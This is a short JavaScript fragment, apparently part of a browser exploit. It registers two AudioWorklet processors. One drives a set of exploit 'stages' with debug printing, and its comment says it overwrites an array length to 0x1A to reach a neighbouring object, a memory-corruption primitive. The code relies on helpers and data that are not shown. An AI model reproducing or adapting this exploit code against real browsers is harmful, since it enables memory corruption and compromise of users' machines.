registerProcessor(
  "a",
  class {
    constructor() {
      port = new AudioWorkletProcessor().port;
      port.onmessage = () => {
        try {
          let del = "-".repeat(10);
          for (let stage of stages) {
            if (currentStage != 0)
              printf(`${del} Stage ${currentStage} ${del}`);
            stage();
            currentStage++;
          }
        } catch (e) {
          printf(`Error: ${e.toString()}`);
          printf(`Stack:\n${e.stack}`);
        }
      };

      // Overwrites the length to 0x1A which is just enough to reach the second box.
      for (var i = 0; i < 10; i++) {
        eval("1 + 0x19");
      }
      return {
        fill: 1,
        a: initialDoubles,
      };
    }
  }
);

registerProcessor(
  "b",
  class {
    constructor() {
      return {
        fill: 1,
        b: initialContiguous,
      };
    }
  }
);
